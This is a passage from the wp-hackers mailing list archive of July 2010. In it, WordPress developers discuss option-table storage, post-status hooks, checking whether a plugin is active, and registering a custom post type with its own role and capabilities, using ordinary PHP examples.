In-Reply-To: <AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>
Message-ID: <AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>

Go it! Thanks :)
Also I would like to know if there is any size limitation of how much data
can be saved in a single row in the options table?
Instead of saving multiple rows, isn't it better to store it as a single
value in a row.

Regarding performance, consider that it can be something which is used in
the front-side or needed only in back-end (irrespective of site's
functioning, just an specific need to operate some data independently
integrated with WP install).

Would like to hear on your thoughts on this.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Sun, Jul 25, 2010 at 2:36 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Sun, Jul 25, 2010 at 4:57 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > What if I have multiple option pages for my single setting? Do I need to
> do
> > anything extra to take care of that?
> >
>
> The way I'd do it is as follows:
>  - Register the setting multiple times, for each option group (page).
>  - In the sanitization callback(s), make sure you account for other indices
> that may be stored but not accounted for on that page save. You can call
> get_option() for example and make sure you keep the original indices you
> want, and then replace the ones you're updating for that page.
>
> Regardless, heavy whitelisting and sanitization is critical to ensure
> stability and security.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sun Jul 25 15:20:04 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 25 Jul 2010 11:20:04 -0400
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <op.vgb9021mspxmuu@ho.st>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
	<op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>
	<op.vgaqg0esspxmuu@ho.st>
	<DC6BDD70-DD8B-4474-8F2C-B0644ACBDF2E@newclarity.net>
	<op.vgb9021mspxmuu@ho.st>
Message-ID: <E9BE0306-A717-42AE-B56C-D3F6F0935D12@newclarity.net>

Dion,

Thanks for answering.

On Jul 24, 2010, at 4:32 AM, Dion Hulse (dd32) wrote:
> One of the problems I feel, is that those who understand some of these problems, are not the ones being asked to achieve the goal, And if they are, they don't realise that other people may need to do the same thing themselves.

Suggestions on how to solve that maybe?

> At the same time, Comes times where you attempt something that no-one else has, and there simply isnt a filter for it.. Its going to happen sometimes

True, but pioneers are always those with arrows in their back, and that's unavoidable.  OTOH, it would help immensely if the cases well-known among those in the know could be better known.

> But with understanding comes blindness,

Very much agreed.

> I for example, would never even dream someone would use pre_get_posts to modify the front-end query, it screams of someone who doesnt have the foggiest of ideas on how the WordPress Query classes work; So its not something I would personally ever needed explaining, Unless it was asked of me, or i saw it being used incorrectly

Maybe that's a small part of the answer; encourage people who write about code solutions to tag them with something like "wpcodereview",  them, and then have them aggregate into one RSS feed?  Then the people who know could just monitor that feed and comment when they see things done wrong and/or write their own blog posts or update the codex when they get inspired to write because they identify a frequent anti-pattern or a particularly egregious error?  I find that its just a lot easier for most people to be reactive than proactive so maybe something like this could work?

> (And i often comment on a select few blogs I'm following for that reason, For example, This comment here: http://wpengineer.com/small-tips-using-wordpress-and-jquery/ - If anyone writes a blog with code excepts related to WordPress often, email me privately with the RSS feed and i'll post comments if I notice anything btw)
> 
> There is near nothing written on the Plugin/Theme upgraders for example, Ask me, and I can probably answer the query however; But I wouldn't know where to start writing for example, I wouldn't have a scenario which would require writing a howto on it.

Awesome.  After my current projects are cleared I plan to upgrade my blog and start writing again on all the things I've learned about WordPress, especially those things where I was able to find nothing written. I'll let you know.

> Mark has recently put a form up for people to ask him questions, each week he's been giving a answer to a select few questions: http://markjaquith.wordpress.com/ask-wordpress/ & http://en.wordpress.com/tag/ask-wordpress/ for the previous answers. That sort of thing is a great start IMO, And I'll do the same one day when I have the time for it.

It's a start. :)

> In the meantime, Developers shouldn't always trust code they find online, Sure, It says it achieves #1, but in actual fact, It does that whilst breaking #2, #3, and #4.. Always triple check what the codes hooking into....

Agreed. The big problem is how does the average WP coder ever know about #2, #3 and #4 (until after the problem surfaces?)

> I know i shouldn't have to say that, but there are far too many Copy-Pasters in the WordPress community as a whole, Many may be able to do it themselves, but trust that 3rd party code was tested correctly,

People copy & paste because it enables them to do things they couldn't do otherwise and that they have no way of achieving it on their own. They people don't understand the right way and never will (and I'm not being pejorative; most people using WordPress have expertise outside of WordPress and that's where the spend their time. Not everyone can or even wants to be a WordPress coding guru.)  So the more we as the community can present best practices the better.

> News for you, Often it isnt, and is written by a developer with less knowledge than you!

Well, not news for me. :) But agreed!


From mikeschinkel at newclarity.net  Sun Jul 25 15:49:58 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 25 Jul 2010 11:49:58 -0400
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
In-Reply-To: <AANLkTimx89SyQAw2Js0Frwh2QkU-Ua3=pPKb+f-h0SD9@mail.gmail.com>
References: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net>
	<4C4B35C2.1020702@simplercomputing.net>
	<AANLkTimx89SyQAw2Js0Frwh2QkU-Ua3=pPKb+f-h0SD9@mail.gmail.com>
Message-ID: <7F742DD1-E04C-4B5E-89A9-1F1C26F7D8A5@newclarity.net>

On Jul 24, 2010, at 4:54 PM, Andrew Nacin wrote:
>>> I'd like to ask about best practices for hooking wp_insert_post().
>>> The questions are when and why to use "save_post" vs.
>>> "wp_insert_post" and more importantly what's the best way to
>>> determine if a post is being added or updated, or is an auto-post?
>>> Actually, I'd love to have that all clarified.
> 
> Auto-drafts are new in 3.0. They're designed to prevent the need to wait for
> an autosave, which is what you're describing. The moment you visit the
> post-new.php screen, you now have a post ID in the form of an auto-draft.
> This allows you to immediately attach media, work with custom fields,
> featured images, and the like. The auto-drafts that don't turn into posts
> are then cleaned up after a week or so.
> 
> Here's the ticket we managed the development of this in:
> http://core.trac.wordpress.org/ticket/11889.

Thanks. That really helps.  

However, it didn't answer the question of when to use the hooks "save_post" instead of "wp_insert_post";  Is there a reason to have two; should we do stuff in one and not the other, or is the fact we have two just legacy cleanup?

> It does have the side effect of triggering save_post. The post status
> transition hooks are probably better to use in most cases however.

Ah, I didn't notice those since they were called in a function below wp_insert_post() and I didn't think to drill down. Thanks!

On Jul 25, 2010, at 12:18 AM, Kunal Bhalla wrote:
> I had to do that recently for my project -- create an 'activity' post when a
> post of a particular type was published. As far as I remember,
> wp_insert_post is called for everything, updating, whatever. I found it
> simpler to hook into the transition post status (like nacin said), checking
> that the post _was_ of the type I needed (automatically eliminating drafts,
> auto-saves), whether the new status was publish, and that the old status
> wasn't.
> 
> I've paste-binned the relevant bits of code here:
> http://pastebin.com/z9SndiU5

Thanks Kunal for including a link to the code.

On Jul 25, 2010, at 2:06 AM, Otto wrote:
> I've had to do this a few times. The only way I found that doesn't
> suck is to hook to transition_post_status like this:
> 
> add_action('transition_post_status','whatever',10,3);
> 
> Your whatever function will get $new, $old, $post, such that
> $new = new post status ('publish')
> $old = old post status
> $post = the complete post object
> 
> By comparing new and old, you can determine if a post is being updated
> or published or what.
> 
> Every other way I tried ended up with one-off anomalies.

Thanks.  This was exactly the kind of answer I was looking for.

Any thoughts though on what "artifacts" to look for when using this (for adding a new one, and just in general)?  Should I compare statuses, should I look at IDs, guids, post_titles, post_names, other?  Any explicit insight will be helpful.

-Mike



From cross at thisismyurl.com  Sun Jul 25 19:31:35 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Sun, 25 Jul 2010 16:31:35 -0300
Subject: [wp-hackers] Checking if a plugin exists
Message-ID: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>

I'm trying to test is a plugin exists before calling a second plugin, but with little luck. Any suggestion would be great.

What I'm doing is .... if(function_exists('stats_get_api_key')) { ... some code ...;} but it's not returning a positive despite being installed. Is there a better way to do it? 

c.

__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708
New Orleans 1 (504) 322 3485

http://christopherross.ca
http://www.thisismyurl.com


From ashishsainiashfame at gmail.com  Sun Jul 25 19:42:31 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 26 Jul 2010 01:12:31 +0530
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
Message-ID: <AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>

Try this http://wpengineer.com/check-if-required-plugin-is-active/

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Jul 26, 2010 at 1:01 AM, Christopher Ross <cross at thisismyurl.com>wrote:

> I'm trying to test is a plugin exists before calling a second plugin, but
> with little luck. Any suggestion would be great.
>
> What I'm doing is .... if(function_exists('stats_get_api_key')) { ... some
> code ...;} but it's not returning a positive despite being installed. Is
> there a better way to do it?
>
> c.
>
> __
>
> Christopher Ross
>
> Toronto      1 (416) 840-5828
> Fredericton 1 (506) 474-2708
> New Orleans 1 (504) 322 3485
>
> http://christopherross.ca
> http://www.thisismyurl.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ashishsainiashfame at gmail.com  Sun Jul 25 19:44:21 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 26 Jul 2010 01:14:21 +0530
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com> 
	<AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>
Message-ID: <AANLkTi=HS4St1w_SHr7gfnnhiDDLgM089xn6QfVtpyJf@mail.gmail.com>

Even better a WordPress function - *is_plugin_active()*

<?php
if (is_plugin_active('plugin-directory/plugin-file.php')) {
    //plugin is activated
}
?>


Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Jul 26, 2010 at 1:12 AM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Try this http://wpengineer.com/check-if-required-plugin-is-active/
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter : http://twitter.com/ashfame
>
>
>
> On Mon, Jul 26, 2010 at 1:01 AM, Christopher Ross <cross at thisismyurl.com>wrote:
>
>> I'm trying to test is a plugin exists before calling a second plugin, but
>> with little luck. Any suggestion would be great.
>>
>> What I'm doing is .... if(function_exists('stats_get_api_key')) { ... some
>> code ...;} but it's not returning a positive despite being installed. Is
>> there a better way to do it?
>>
>> c.
>>
>> __
>>
>> Christopher Ross
>>
>> Toronto      1 (416) 840-5828
>> Fredericton 1 (506) 474-2708
>> New Orleans 1 (504) 322 3485
>>
>> http://christopherross.ca
>> http://www.thisismyurl.com
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From frank at bueltge.de  Sun Jul 25 19:45:42 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Sun, 25 Jul 2010 21:45:42 +0200
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com> 
	<AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>
Message-ID: <AANLkTik1j=0uzZ70S+QRRrLeoZ_jtMkt9WbHMEQm0K80@mail.gmail.com>

Thanks for the link to my post ;)
also a great solution is the core fucntion:
http://codex.wordpress.org/Function_Reference/is_plugin_active

On Sun, Jul 25, 2010 at 9:42 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Try this http://wpengineer.com/check-if-required-plugin-is-active/
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Mon, Jul 26, 2010 at 1:01 AM, Christopher Ross <cross at thisismyurl.com
> >wrote:
>
> > I'm trying to test is a plugin exists before calling a second plugin, but
> > with little luck. Any suggestion would be great.
> >
> > What I'm doing is .... if(function_exists('stats_get_api_key')) { ...
> some
> > code ...;} but it's not returning a positive despite being installed. Is
> > there a better way to do it?
> >
> > c.
> >
> > __
> >
> > Christopher Ross
> >
> > Toronto      1 (416) 840-5828
> > Fredericton 1 (506) 474-2708
> > New Orleans 1 (504) 322 3485
> >
> > http://christopherross.ca
> > http://www.thisismyurl.com
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From cross at thisismyurl.com  Sun Jul 25 19:46:02 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Sun, 25 Jul 2010 16:46:02 -0300
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <AANLkTi=HS4St1w_SHr7gfnnhiDDLgM089xn6QfVtpyJf@mail.gmail.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
	<AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>
	<AANLkTi=HS4St1w_SHr7gfnnhiDDLgM089xn6QfVtpyJf@mail.gmail.com>
Message-ID: <C4097102-C6B8-4A42-BEEE-56EC31ABC72C@thisismyurl.com>

Thanks!


On 2010-07-25, at 4:44 PM, Ashish Saini wrote:

> Even better a WordPress function - *is_plugin_active()*
> 
> <?php
> if (is_plugin_active('plugin-directory/plugin-file.php')) {
>    //plugin is activated
> }
> ?>
> 
> 
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
> : http://twitter.com/ashfame
> 


__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708
New Orleans 1 (504) 322 3485

http://christopherross.ca
http://www.thisismyurl.com


From wp at andrewnacin.com  Sun Jul 25 21:19:48 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sun, 25 Jul 2010 17:19:48 -0400
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <C4097102-C6B8-4A42-BEEE-56EC31ABC72C@thisismyurl.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com> 
	<AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com> 
	<AANLkTi=HS4St1w_SHr7gfnnhiDDLgM089xn6QfVtpyJf@mail.gmail.com> 
	<C4097102-C6B8-4A42-BEEE-56EC31ABC72C@thisismyurl.com>
Message-ID: <AANLkTi=K97sP7yVM0djYtC2SM60bdkz8_FkuGodARsQe@mail.gmail.com>

if (is_plugin_active('plugin-directory/plugin-file.php')) {
   //plugin is activated
}

That is generally a fine solution, though there are two others:

1. Checking for function or class existence is also a solid solution, one I
would probably use over is_plugin_active().

2. If you're building plugins that depend on others, then it is best to
attach the initialization of the sub-plugin to a hook in the parent plugin.
Then the sub-plugin will noop if the parent plugin is not activated.
BuddyPress does this. Of course, that means the parent plugin needs to have
hooks in place for that.

From wp at andrewnacin.com  Sun Jul 25 21:28:01 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sun, 25 Jul 2010 17:28:01 -0400
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv> 
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com> 
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com> 
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com> 
	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>
Message-ID: <AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>

On Sun, Jul 25, 2010 at 6:39 AM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Also I would like to know if there is any size limitation of how much data
> can be saved in a single row in the options table?
> Instead of saving multiple rows, isn't it better to store it as a single
> value in a row.


The hypothetical size limitation according to MySQL is something like 2^32
bytes. If you are holding many kilobytes of data in an autoloaded row,
especially if it might scale O(N), then you may wish to rethink your storage
strategy. (Post type?)

Regarding performance, consider that it can be something which is used in
> the front-side or needed only in back-end (irrespective of site's
> functioning, just an specific need to operate some data independently
> integrated with WP install).


Again, this is more or less a hypothetical, so it's really tough to blindly
address your concerns. Even more so if this isn't a plugin you plan to
distribute and rather you know the server and caching system it is running
against. A rule of thumb might be to not autoload options that can get
really large, if you'll never need them on the front end, but again I'm not
thinking about that in the context of a caching system. If what you do need
on the front end is small, and you're also storing some pretty significant
data in your DB option, you may wish to split into two options.

From aesqe at skyphe.org  Sun Jul 25 21:33:51 2010
From: aesqe at skyphe.org (aesqe)
Date: Sun, 25 Jul 2010 23:33:51 +0200
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <AANLkTi=K97sP7yVM0djYtC2SM60bdkz8_FkuGodARsQe@mail.gmail.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
	<AANLkTimT7TGPag4Ct_6Uj60fJQLiTeqMZ8KM10eScyHL@mail.gmail.com>
	<AANLkTi=HS4St1w_SHr7gfnnhiDDLgM089xn6QfVtpyJf@mail.gmail.com>
	<C4097102-C6B8-4A42-BEEE-56EC31ABC72C@thisismyurl.com>
	<AANLkTi=K97sP7yVM0djYtC2SM60bdkz8_FkuGodARsQe@mail.gmail.com>
Message-ID: <4C4CADBF.9030702@skyphe.org>

I've always found 1. to be the easiest. Just hook your function to 
'plugins_loaded' and check for a function or class name.

function check_for_plugin()
{
	if( function_exists('some_function') )
		do_something();
}
add_action('plugins_loaded', 'check_for_plugin');

is_plugin_active() requires a folder and a file name, and those might 
not be the same on all WP installations.



On 25.7.2010 23:19, Andrew Nacin wrote:
> if (is_plugin_active('plugin-directory/plugin-file.php')) {
>     //plugin is activated
> }
>
> That is generally a fine solution, though there are two others:
>
> 1. Checking for function or class existence is also a solid solution, one I
> would probably use over is_plugin_active().
>
> 2. If you're building plugins that depend on others, then it is best to
> attach the initialization of the sub-plugin to a hook in the parent plugin.
> Then the sub-plugin will noop if the parent plugin is not activated.
> BuddyPress does this. Of course, that means the parent plugin needs to have
> hooks in place for that.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

-- 
Bruno "Aesqe" Babic
--------------------------------------
http://skyphe.org .:. http://brlog.biz

From angelia at 10sexyapples.com  Sun Jul 25 21:58:38 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Sun, 25 Jul 2010 14:58:38 -0700
Subject: [wp-hackers] Is there any compelling reason to use a custom post
	type plugin?
Message-ID: <AANLkTi=SD0J8ndTfcCX2SHnu_a_POtE4A0Yw=+cEqO=J@mail.gmail.com>

I figured that would be the response.

I really could kick myself for having made the decision to go with a plugin
on this, especially as I already had it all manually coded, *shucks*.

I was attempting to be forward thinking in having a gui for my client when
they got a little more ninja in using the site, but, un-ninja'd myself in
the process.

I think I may have also made the decision at a point when there was some
debate over rewrites not being handled in core. I just ran out of the room
screaming apparently.

Well, I've really got my work cut out for me now in unraveling it from the
work I've done.

Thanks again for the input~

From otto at ottodestruct.com  Sun Jul 25 22:26:56 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 25 Jul 2010 17:26:56 -0500
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
In-Reply-To: <7F742DD1-E04C-4B5E-89A9-1F1C26F7D8A5@newclarity.net>
References: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net> 
	<4C4B35C2.1020702@simplercomputing.net>
	<AANLkTimx89SyQAw2Js0Frwh2QkU-Ua3=pPKb+f-h0SD9@mail.gmail.com> 
	<7F742DD1-E04C-4B5E-89A9-1F1C26F7D8A5@newclarity.net>
Message-ID: <AANLkTinddg6B6xO2TQuKJAiU8fX34BZHDow7r6mnFvBz@mail.gmail.com>

On Sun, Jul 25, 2010 at 10:49 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Any thoughts though on what "artifacts" to look for when using this (for adding a new one, and just in general)? ?Should I compare statuses, should I look at IDs, guids, post_titles, post_names, other? ?Any explicit insight will be helpful.

*Every* post type will trigger this. Even nav_menu_items. Check the
post type before acting.

-Otto

From otto at ottodestruct.com  Sun Jul 25 22:29:29 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 25 Jul 2010 17:29:29 -0500
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
Message-ID: <AANLkTikyL8WUSKwgZ0uDQis+3f_sZcSSHgHBpVWG2Nft@mail.gmail.com>

On Sun, Jul 25, 2010 at 2:31 PM, Christopher Ross <cross at thisismyurl.com> wrote:
> I'm trying to test is a plugin exists before calling a second plugin, but with little luck. Any suggestion would be great.
>
> What I'm doing is .... if(function_exists('stats_get_api_key')) { ... some code ...;} but it's not returning a positive despite being installed. Is there a better way to do it?

You can't predict the order plugins will load in. Wait for the
plugins_loaded action before doing your check.

-Otto

From lox.dev at knc.nc  Sun Jul 25 22:57:58 2010
From: lox.dev at knc.nc (Lox)
Date: Mon, 26 Jul 2010 09:57:58 +1100
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <E9BE0306-A717-42AE-B56C-D3F6F0935D12@newclarity.net>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
	<op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>
	<op.vgaqg0esspxmuu@ho.st>
	<DC6BDD70-DD8B-4474-8F2C-B0644ACBDF2E@newclarity.net>
	<op.vgb9021mspxmuu@ho.st>
	<E9BE0306-A717-42AE-B56C-D3F6F0935D12@newclarity.net>
Message-ID: <AANLkTim0PaFB+2z5ttv5uKB9W59VX0XYtErzfkS_mwG5@mail.gmail.com>

+1 for a Best practices wp guide.

Le 26 juil. 2010 02:20, "Mike Schinkel" <mikeschinkel at newclarity.net> a
?crit :
> Dion,
>
> Thanks for answering.
>
> On Jul 24, 2010, at 4:32 AM, Dion Hulse (dd32) wrote:
>> One of the problems I feel, is that those who understand some of these
problems, are not the ones being asked to achieve the goal, And if they are,
they don't realise that other people may need to do the same thing
themselves.
>
> Suggestions on how to solve that maybe?
>
>> At the same time, Comes times where you attempt something that no-one
else has, and there simply isnt a filter for it.. Its going to happen
sometimes
>
> True, but pioneers are always those with arrows in their back, and that's
unavoidable. OTOH, it would help immensely if the cases well-known among
those in the know could be better known.
>
>> But with understanding comes blindness,
>
> Very much agreed.
>
>> I for example, would never even dream someone would use pre_get_posts to
modify the front-end query, it screams of someone who doesnt have the
foggiest of ideas on how the WordPress Query classes work; So its not
something I would personally ever needed explaining, Unless it was asked of
me, or i saw it being used incorrectly
>
> Maybe that's a small part of the answer; encourage people who write about
code solutions to tag them with something like "wpcodereview", them, and
then have them aggregate into one RSS feed? Then the people who know could
just monitor that feed and comment when they see things done wrong and/or
write their own blog posts or update the codex when they get inspired to
write because they identify a frequent anti-pattern or a particularly
egregious error? I find that its just a lot easier for most people to be
reactive than proactive so maybe something like this could work?
>
>> (And i often comment on a select few blogs I'm following for that reason,
For example, This comment here:
http://wpengineer.com/small-tips-using-wordpress-and-jquery/ - If anyone
writes a blog with code excepts related to WordPress often, email me
privately with the RSS feed and i'll post comments if I notice anything btw)
>>
>> There is near nothing written on the Plugin/Theme upgraders for example,
Ask me, and I can probably answer the query however; But I wouldn't know
where to start writing for example, I wouldn't have a scenario which would
require writing a howto on it.
>
> Awesome. After my current projects are cleared I plan to upgrade my blog
and start writing again on all the things I've learned about WordPress,
especially those things where I was able to find nothing written. I'll let
you know.
>
>> Mark has recently put a form up for people to ask him questions, each
week he's been giving a answer to a select few questions:
http://markjaquith.wordpress.com/ask-wordpress/ &
http://en.wordpress.com/tag/ask-wordpress/ for the previous answers. That
sort of thing is a great start IMO, And I'll do the same one day when I have
the time for it.
>
> It's a start. :)
>
>> In the meantime, Developers shouldn't always trust code they find online,
Sure, It says it achieves #1, but in actual fact, It does that whilst
breaking #2, #3, and #4.. Always triple check what the codes hooking
into....
>
> Agreed. The big problem is how does the average WP coder ever know about
#2, #3 and #4 (until after the problem surfaces?)
>
>> I know i shouldn't have to say that, but there are far too many
Copy-Pasters in the WordPress community as a whole, Many may be able to do
it themselves, but trust that 3rd party code was tested correctly,
>
> People copy & paste because it enables them to do things they couldn't do
otherwise and that they have no way of achieving it on their own. They
people don't understand the right way and never will (and I'm not being
pejorative; most people using WordPress have expertise outside of WordPress
and that's where the spend their time. Not everyone can or even wants to be
a WordPress coding guru.) So the more we as the community can present best
practices the better.
>
>> News for you, Often it isnt, and is written by a developer with less
knowledge than you!
>
> Well, not news for me. :) But agreed!
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From list at expost.org  Mon Jul 26 02:28:01 2010
From: list at expost.org (Raj)
Date: Mon, 26 Jul 2010 07:58:01 +0530
Subject: [wp-hackers] Adding a custom content type that only a particular
	role can create/modify
Message-ID: <000001cb2c6a$2da53b70$88efb250$@org>

Hi all,

 

Here's what I need to do in my plugin:

 

1.       Add a Wiki Page Content Type

2.      Add 'Wiki Editor' Role

3.      Ensure that the users of Wiki Editor role and only they are able to
create and edit 'Wiki Page' type.

 

 

Here's what happens:

 

Nothing. When I create a user of type Wiki Editor and then log in and then
log in as that user, I see no option to create content of any type. When the
user logs in I see just two menu items -  Dashboard and  Profile

 

I had initially set the capability_type to 'post'. But that allowed anyone
with the 'publish_posts' permissions to create Wiki Pages. So I renamed the
capability_type to 'wiki_page'. Then the Wiki Page content type became
unavailable for the administrator account. To solve that I added wiki_editor
to the administrator's role after which the Wiki Page was visible to the
admnistrator's account.

 

Here's the full code:



<?php

/*

Plugin Name: Wiki

Author: Rajasekharan S

Description: This is a plugin to add a Wiki to Wordpress. 

*/

 

function wiki_init() 

{

     

     

  $labels = array(

    'name' => _x('Wiki Pages', 'post type general name'),

    'singular_name' => _x('Wiki Page', 'post type singular name'),

    'add_new' => _x('Add New', 'wikipage'),

    'add_new_item' => __('Add New Wiki Page'),

    'edit_item' => __('Edit Wiki Page'),

    'new_item' => __('New Wiki Page'),

    'view_item' => __('View Wiki Page'),

    'search_items' => __('Search Wiki Pages'),

    'not_found' =>  __('No wikipages found'),

    'not_found_in_trash' => __('No wikipages found in Trash'), 

    'parent_item_colon' => ''

  );

  

  $args = array(

    'labels' => $labels,

    'public' => true,

    'publicly_queryable' => true,

    'show_ui' => true, 

    'query_var' => true,

    'rewrite' => true,

    'capability_type' => 'wiki_page',

    'hierarchical' => false,

    'menu_position' => 5,

    'supports' =>
array('title','editor','author','thumbnail','excerpt','comments')

  ); 

  register_post_type('wikipage',$args);

  

  $role_capabilities =
array('read'=>1,'edit_wiki_page'=>1,'edit_others_wiki_pages'=>1,'edit_publis
hed_wiki_pages'=>1,'read'=>1,'publish_wiki_pages'=>1);

  

  add_role( 'wikicontributor', 'WikiContibutor', $role_capabilities );

  

}

 

add_action('init', 'wiki_init');

 

Please tell me what I am doing wrong. How do I make this thing work. 

 

Warm Regards,

Raj Sekharan

 

 


From carlroett at gmail.com  Mon Jul 26 07:11:17 2010
From: carlroett at gmail.com (Carl Roett)
Date: Mon, 26 Jul 2010 01:11:17 -0600
